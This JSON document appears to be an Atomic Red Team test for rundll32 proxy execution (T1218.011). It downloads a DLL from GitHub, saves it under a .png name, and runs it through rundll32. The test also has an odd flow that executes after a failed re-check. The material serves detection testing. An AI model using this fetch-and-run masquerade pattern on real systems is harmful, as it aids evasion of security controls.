{
  "id": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
  "name": "Execution of non-dll using rundll32.exe",
  "description": "Rundll32.exe running non-dll \n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "e9d00eea-2b8a-4b33-b286-2e5564530780",
      "type": "execute-command",
      "data": {
        "command": "rundll32.exe #{input_file}, StartW\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "84c5023a-2234-44b0-8289-f30dc6f4c104",
      "name": "Check dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "d6c6d335-c527-4147-95a6-59eab5087529",
      "name": "Resolve dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "065bb62d-1168-45c8-a826-383d64a33527",
      "name": "Re-check dependency 1/1",
      "description": "Non-dll file must exist on disk at specified location\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "84c5023a-2234-44b0-8289-f30dc6f4c104",
      "p": "on-success",
      "o": "e9d00eea-2b8a-4b33-b286-2e5564530780"
    },
    {
      "s": "84c5023a-2234-44b0-8289-f30dc6f4c104",
      "p": "on-failure",
      "o": "d6c6d335-c527-4147-95a6-59eab5087529"
    },
    {
      "s": "d6c6d335-c527-4147-95a6-59eab5087529",
      "p": "on-success",
      "o": "065bb62d-1168-45c8-a826-383d64a33527"
    },
    {
      "s": "065bb62d-1168-45c8-a826-383d64a33527",
      "p": "on-failure",
      "o": "e9d00eea-2b8a-4b33-b286-2e5564530780"
    }
  ],
  "tags": [
    "T1218.011",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "input_url",
      "type": "url",
      "description": "Url to download the DLL",
      "value": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
    },
    {
      "name": "input_file",
      "type": "string",
      "description": "Non-dll file",
      "value": "C:\\Users\\$env:username\\Downloads\\calc.png"
    }
  ]
}